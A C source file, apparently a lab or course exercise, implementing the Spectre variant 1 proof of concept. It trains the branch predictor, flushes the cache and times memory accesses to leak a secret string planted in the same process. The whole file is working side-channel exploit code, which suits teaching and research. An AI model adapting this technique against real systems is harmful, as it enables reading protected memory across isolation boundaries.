#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include "shuffle_map.h"

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

// used to prevent the compiler from optimizing out victim_function()
uint8_t temp = 0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}

 __attribute__((always_inline)) inline void cache_flush_one(void *ptr) {
    _mm_clflush(ptr);
    // wait several cycles for clflush to commit
    for (volatile int j = 0; j < 100; j++);
    // memory fence
    _mm_mfence();
}

 __attribute__((always_inline)) inline void cache_flush_cmp(void) {
  /* cache_flush_one(&temp); */
  cache_flush_one(&array1_size);
}


 __attribute__((always_inline)) inline void cache_flush(void) {
  for (int i = 0; i < 256; i++){
    cache_flush_one(&array2[i*512]);
  }
  cache_flush_cmp();
}


 __attribute__((always_inline)) inline void train_branch_predictor(void) {
  for (volatile int i = 0; i < 99; i++){
    for (volatile int j = 0; j < 198; j++){
      for (volatile int k = 0; k < 57; k++){
      }
    }
  }
}


/**
 * Spectre Attack Function to Read Specific Byte.
 *
 * @param malicious_x The malicious x used to call the victim_function
 *
 * @param values      The two most likely guesses returned by your attack
 *
 * @param scores      The score (larger is better) of the two most likely guesses
 */
void attack(size_t malicious_x, uint8_t value[2], int score[2]) {
  const int threshold = 100;
  int hits[256] = {0};

  for (int n =0; n < 1e3; n++) {
    // Train branch predictor.
    for (int i = 0; i < 16; i++) {
      train_branch_predictor();

      for (int j = 0; j < 16; j++) {
        victim_function(j);
      }
    }
    // Flush cache.
    cache_flush();

    // Call with malicious payload.
    victim_function(malicious_x);

    // Check what got accessed.
    for (int i = 0; i < 256; i++){
        unsigned int next_idx = forward[i] * 512;
        volatile unsigned int junk = 0; // A junk number as parameter
        uint64_t t0 = __rdtscp((unsigned int*)&junk); // get current time stamp
        array2[next_idx]++;
        uint64_t delta = __rdtscp((unsigned int*)&junk) - t0;
        if (delta < threshold) {
          hits[forward[i]]++;
        }
    }
  } 


  // Find best guess.
  value[0] = (uint8_t)0;
  score[0] = hits[0];

  for (int i = 1; i < sizeof(hits) / sizeof(*hits); i++) {
    if (hits[i] > score[0]) {
      score[0] = hits[i];
      value[0] = (uint8_t)i;
    }
  }

  // Find second best guess.
  score[1] = -1;

  for (int i = 0; i < sizeof(hits) / sizeof(*hits); i++) {
    if ((uint8_t)i != value[0] && hits[i] > score[1]) {
      score[1] = hits[i];
      value[1] = (uint8_t)i;
    }
  }
}

int main(int argc, const char **argv) {
  printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
  size_t malicious_x = (size_t)(secret - (char *)array1); /* read the secret */
  int score[2], len = strlen(secret);
  uint8_t value[2];

  // initialize array2 to make sure it is in its own physical page and
  // not in a copy-on-write zero page
  for (size_t i = 0; i < sizeof(array2); i++)
    array2[i] = 1; 

  // attack each byte of the secret, successively
  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    attack(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    printf("\n");
  }
  return (0);
}
